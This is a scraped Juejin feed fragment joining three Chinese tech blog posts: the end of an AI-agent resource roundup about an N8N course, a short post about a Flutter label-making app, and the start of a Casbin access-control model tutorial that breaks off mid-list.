<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bc9fb176f3f4320adc86fadf8a3fb70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=Ny6tBG0ZOXY3ACoDLZT%2B8u%2Buh8Q%3D" alt="" loading="lazy"/></p>
<p>LinkedIn Learning平台官方推出的企业级AI智能体课程资料，由专业讲师Morten Rand-Hendriksen授课。提供完整的N8N智能体开发教程，从零基础到高级应用的系统性学习路径，专注于业务流程自动化和AI智能体构建。</p>
<h4 data-id="heading-89">🎯 课程核心内容</h4>
<h5 data-id="heading-90">📚 学习模块体系</h5>
<ul>
<li><strong>N8N平台基础</strong>：云端/本地部署选择、架构理解、核心概念掌握</li>
<li><strong>多服务集成</strong>：Google Sheets、OpenAI、Slack三大核心服务连接</li>
<li><strong>AI智能体设计</strong>：自然语言处理、数据查询、多步骤决策流程</li>
<li><strong>MCP协议应用</strong>：Model Context Protocol深度集成和自定义服务器开发</li>
</ul>
<h5 data-id="heading-91">🛠️ 实战工作流项目</h5>
<ul>
<li><strong>主要智能体</strong>：<code>Volunteer_Lookup.json</code> - 志愿者查询AI智能体</li>
<li><strong>Google Sheets MCP</strong>：<code>Google_Sheets_MCP.json</code> - 自定义MCP服务器集成</li>
<li><strong>数据查询工具</strong>：<code>Row_lookup.json</code> - 智能数据筛选和检索</li>
<li><strong>综合自动化流</strong>：<code>Built_Out_Automation_Flow.json</code> - 多智能体协作系统</li>
</ul>
<h4 data-id="heading-92">🚀 技术特色与创新</h4>
<h5 data-id="heading-93">🔧 企业级架构设计</h5>
<ul>
<li><strong>依赖管理</strong>：工作流导入顺序优化（Row_lookup → Google_Sheets_MCP → Volunteer_Lookup）</li>
<li><strong>API集成</strong>：OpenAI GPT模型调用和响应处理</li>
<li><strong>数据管理</strong>：111条完整志愿者数据集 + 9条测试数据集</li>
<li><strong>安全配置</strong>：凭证管理和API密钥保护机制</li>
</ul>
<h5 data-id="heading-94">💡 教学方法优势</h5>
<ul>
<li><strong>循序渐进</strong>：从简单概念到复杂系统的阶梯式学习</li>
<li><strong>实战导向</strong>：真实业务场景（志愿者管理系统）案例</li>
<li><strong>多平台支持</strong>：云端N8N和自托管环境双重选择</li>
<li><strong>详细文档</strong>：完整的设置说明和导入指南</li>
</ul>
<h4 data-id="heading-95">📊 实际应用价值</h4>
<h5 data-id="heading-96">🎯 目标用户群体</h5>
<ul>
<li><strong>业务分析师</strong>：学习无代码AI智能体开发</li>
<li><strong>自动化工程师</strong>：掌握企业级工作流设计</li>
<li><strong>产品经理</strong>：理解AI智能体产品开发流程</li>
<li><strong>技术团队负责人</strong>：评估N8N在企业中的应用潜力</li>
</ul>
<h5 data-id="heading-97">🔄 业务场景覆盖</h5>
<ul>
<li><strong>客户服务自动化</strong>：智能客服和查询响应系统</li>
<li><strong>数据处理流程</strong>：表格数据查询和报告生成</li>
<li><strong>团队协作优化</strong>：Slack集成的智能通知和任务分发</li>
<li><strong>业务流程智能化</strong>：复杂多步骤业务逻辑自动执行</li>
</ul>
<h4 data-id="heading-98">🏗️ 工程实践特色</h4>
<h5 data-id="heading-99">📋 完整开发流程</h5>
<pre><code class="hljs language-markdown" lang="markdown"> 
<span class="hljs-section"># 项目设置步骤</span>
​
<span class="hljs-bullet">1.</span> Google账户设置（推荐专用测试账户）
​
<span class="hljs-bullet">2.</span> OpenAI API密钥申请和项目创建
​
<span class="hljs-bullet">3.</span> Slack工作区配置（推荐专用测试环境）
​
<span class="hljs-bullet">4.</span> N8N实例部署（云端或本地环境）
</code></pre>
<h5 data-id="heading-100">🔍 数据结构设计</h5>
<ul>
<li><strong>志愿者信息模型</strong>：ID、姓名、联系方式、活动记录、管理者、状态</li>
<li><strong>CSV格式支持</strong>：标准化数据导入和Google Sheets集成</li>
<li><strong>虚构数据保护</strong>：完全AI生成的测试数据，无真实个人信息</li>
</ul>
<h5 data-id="heading-101">🎨 用户体验优化</h5>
<ul>
<li><strong>自然语言查询</strong>：支持复杂的人类语言指令</li>
<li><strong>智能响应格式</strong>：结构化的查询结果和友好的用户交互</li>
<li><strong>错误处理机制</strong>：完善的异常情况处理和用户提示</li>
</ul>
<hr/>
<h3 data-id="heading-102">总结</h3>
<p>这十个GitHub仓库构成了AI智能体技术栈的完整生态系统，从理论基础到工程实践，从开发工具到部署运维，为不同背景的开发者提供了系统性的学习路径。</p>
<h4 data-id="heading-103">技术发展趋势</h4>
<ol>
<li><strong>多模态智能体</strong>：集成视觉、语言和行为的综合智能系统</li>
<li><strong>自主学习能力</strong>：具备持续学习和自我优化的智能体架构</li>
<li><strong>企业级应用</strong>：面向垂直行业的专业化智能体解决方案</li>
<li><strong>安全与可控</strong>：可解释、可控制的负责任AI智能体设计</li>
</ol>
<h4 data-id="heading-104">学习建议</h4>
<ul>
<li><strong>基础阶段</strong>：从Microsoft的入门教程开始，建立智能体的基础概念</li>
<li><strong>深入阶段</strong>：通过LLM相关项目掌握核心技术原理</li>
<li><strong>实践阶段</strong>：使用N8N等工具快速构建原型和应用</li>
<li><strong>进阶阶段</strong>：学习生产级系统设计和工程最佳实践</li>
</ul>
<p>通过系统学习这些开源项目，开发者可以全面掌握AI智能体的设计思维、技术实现和工程化部署，为构建下一代智能化应用奠定坚实基础。</p>
<h3 data-id="heading-105">学习资源推荐</h3>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[仿普贴标签实现一个自己的app]]></title>    <link>https://juejin.cn/post/7581769891499032595</link>    <guid>https://juejin.cn/post/7581769891499032595</guid>    <pubDate>2025-12-10T03:32:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581769891499032595" data-draft-id="7581751726505852971" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="仿普贴标签实现一个自己的app"/> <meta itemprop="keywords" content="前端,Android"/> <meta itemprop="datePublished" content="2025-12-10T03:32:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="火柴就是我"/> <meta itemprop="url" content="https://juejin.cn/user/272334614705575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            仿普贴标签实现一个自己的app
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/272334614705575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    火柴就是我
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:32:26.000Z" title="Wed Dec 10 2025 03:32:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>用flutter实现一个标签app,类似于dlabel 跟 普调标签。前期只专注于实现添加各种标签。</p>
<p>实现功能列表：</p>
<ol>
<li><code>添加矩形图元(支持设置圆角 设置是否填充 支持设置边框宽度)</code></li>
<li><code>添加圆形图元(支持设置是否填充 支持设置边框宽度)</code></li>
<li><code>图元支持选中 平移 拉伸 任意角度旋转 旋转不影响手势响应 旋转之后平移拉伸交互合理</code></li>
<li><code>添加文本 暂时支持普通绘制</code></li>
<li><code>增加刻度</code></li>
<li><code>修改图元的宽高坐标都以刻度尺数值为准</code></li>
<li><code>修复圆形旋转120度 拉伸异常问题</code></li>
<li><code>文本支持水平 垂直 居左中右 均分</code></li>
<li><code>文本支持字号 字间距 行间距 调整</code></li>
<li><code>文本支持粗体 斜体 下划线 中划线 设置</code></li>
<li><code>文本支持自动字号 文本颜色调整</code></li>
<li><code>实现图形的添加 圆形 三角形 多边形</code></li>
<li><code>支持设置虚线 调整线条宽度 设置是否填充</code></li>
</ol>
<p>....持续开发</p>
<p>下一个功能 图形属性页面 三角形 矩形 圆形</p>
<p>当前效果图</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b78b872eb02d4f25be588cd7c0daeb21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942397&amp;x-signature=0iH8%2Bt4EUIzqPc8F5upxVYO6vGg%3D" alt="img_v3_02sq_352d28d2-e431-4976-855d-0600e5af808g.jpg" width="30%" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7409098905ed4d3ca9b17134e81eb764~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942397&amp;x-signature=Ds2FZ%2BimRvDWaRmmPQXGK9WdHTk%3D" alt="img_v3_02sq_7c34eb15-e2c5-4e42-9ab9-e3e4d571c23g.jpg" width="30%" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/964dab45ff524141acba213400871fc4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942397&amp;x-signature=e0VRWbgEYmM5gcWjs0guV84lqds%3D" alt="20251210-113106.jpg" width="30%" loading="lazy"/>
<p>感兴趣可以下载瞅瞅:
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FnewPersonKing%2Fflutter_label" target="_blank" title="https://github.com/newPersonKing/flutter_label" ref="nofollow noopener noreferrer">github.com/newPersonKi…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[解读Casbin 之一： 常见的访问控制模型配置]]></title>    <link>https://juejin.cn/post/7581769891498835987</link>    <guid>https://juejin.cn/post/7581769891498835987</guid>    <pubDate>2025-12-10T03:13:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581769891498835987" data-draft-id="7581669438576820260" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="解读Casbin 之一： 常见的访问控制模型配置"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-10T03:13:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="西门老铁"/> <meta itemprop="url" content="https://juejin.cn/user/4336129588855143"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            解读Casbin 之一： 常见的访问控制模型配置
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4336129588855143/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    西门老铁
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:13:13.000Z" title="Wed Dec 10 2025 03:13:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>权限控制是每个管理系统的关键组成部分，而Casbin是一个强大且高效的开源访问控制库，支持各种<a href="https://link.juejin.cn?target=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FAccess_control%23Access_control_models" target="_blank" title="https://en.wikipedia.org/wiki/Access_control#Access_control_models" ref="nofollow noopener noreferrer">访问控制模型</a>，用于在全局范围内执行授权。</p>
<p>Casbin 目前支持 Golang、Java、C/C++、Node.js、Javascript、PHP、Laravel、Python、.NET (C#)、Delphi、Rust、Ruby、Swift (Objective-C)、Lua (OpenResty)、Dart (Flutter) 和 Elixir。</p>
<p>本文将通过简单易懂的流程演示 casbin 的工作原理及其不同的可用模型配置。</p>
<h2 data-id="heading-0">Casbin 的工作流程</h2>
<p>在深入了解不同的模型配置之前，让我们先通过如下所示的简单概览图来了解 casbin 的工作流程。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f11821e431744e72a952c59b5043a145~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_6Zeo6ICB6ZOB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941193&amp;x-signature=4Yt5YMBTGfwdBCCOrGly7eIF%2BZA%3D" alt="image.png" loading="lazy"/></p>
<p>上图将整个工作流程分为两个阶段，即<em>配置策略</em>和<em>执行策略</em>。</p>
<h3 data-id="heading-1">配置策略</h3>
<p>此阶段定义了权限控制的方法，包括定义权限模型和权限策略。</p>
<h4 data-id="heading-2">STEP 1 Model（定义模型）</h4>
<p>在这里，我们根据需求配置模型。我们使用<a href="https://link.juejin.cn?target=https%3A%2F%2Ffile.org%2Fextension%2Fconf" target="_blank" title="https://file.org/extension/conf" ref="nofollow noopener noreferrer">CONF</a>文件（.conf 文件扩展名）来抽象模型配置。此配置基于 PERM 元模型（Policy, Effect, Request, Matchers）分别表示策略，效果，请求，匹配器。</p>
<p>在上图中，演示了 Casbin 中最基本、最简单的ACL模型。</p>
<h4 data-id="heading-3">STEP 2 Policy（定义策略）</h4>
<p>策略的基本逻辑是<code>谁可以做什么</code></p>
<p>策略的基本语法是<code>p = sub, obj, act, eft</code></p>
<p>这种语法可以理解为：谁（<strong>sub</strong>）可以/不能（<strong>eft:allow/deny</strong>）对某个资源（<strong>obj</strong>）执行什么（<strong>act</strong>）。</p>
<p>这里<code>eft</code>可以是 <code>true``allow</code>或 <code>false</code> <code>deny</code>。如果未指定，则默认值为 <code>true</code> <code>allow</code>。</p>
<p>上图中已指明了四条权限策略：</p>
<ol>
<li>John 可以阅读 RECORD1</li>
<li>John 不能写入 RECORD1</li>
<li>Harry 可以阅读 RECORD1</li>
<li>Harry 可以修改 RECORD1</li>
</ol>
<h3 data-id="heading-4">执行策略</h3>
<p>此阶段基于模型和策略进行权限的判断。</p>
<h4 data-id="heading-5">STEP 3 Request（发起请求）</h4>
<p>请求定义了用户尝试访问某个资源或对其执行所需操作时的动作。</p>
<p>图中所示有两条请求。</p>
<ol>
<li>John 阅读 RECORD1</li>
<li>John 写入 RECORD1</li>
</ol>
<h4 data-id="heading-6">STEP 4 Matcher（将请求匹配策略）</h4>
<p>执行策略的第一步是根据请求查询匹配的策略。在上面的示例中，我们使用以下匹配表达式来确保请求中的主题、对象和操作与策略规则中的相应内容相匹配。我们可以把它理解为一个 SQL 查询的 WHERE 语句，<code>r</code>对象即是请求体，<code>p</code> 对象是策略列表中的记录。</p>
<pre><code class="hljs language-css" lang="css">m = r<span class="hljs-selector-class">.sub</span> == <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sub</span> &amp;&amp; r<span class="hljs-selector-class">.obj</span> == <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.obj</span> &amp;&amp; r<span class="hljs-selector-class">.act</span> == <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.act</span>
</code></pre>
<h4 data-id="heading-7">STEP 5 Policy Effect（最终判定）</h4>
<p>匹配器可能查询到多条记录，这里定义了如何根据匹配到的策略决定最终结果。在上面的示例中，我们定义了以下策略，这个语句表示只要存在一个匹配的策略允许用户执行操作，最终结果即允许。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">e</span> = some(where (p.eft == allow))
</code></pre>
<p>另一种更严谨的验证方式同时要求确保没有策略禁止用户执行操作：</p>
<pre><code class="hljs language-scss" lang="scss">e = <span class="hljs-built_in">some</span>(where (p.eft == allow)) &amp;&amp; !<span class="hljs-built_in">some</span>(where (p.eft == deny))
</code></pre>
<p>根据以上判定，casbin 的授权结果为</p>
<ol>
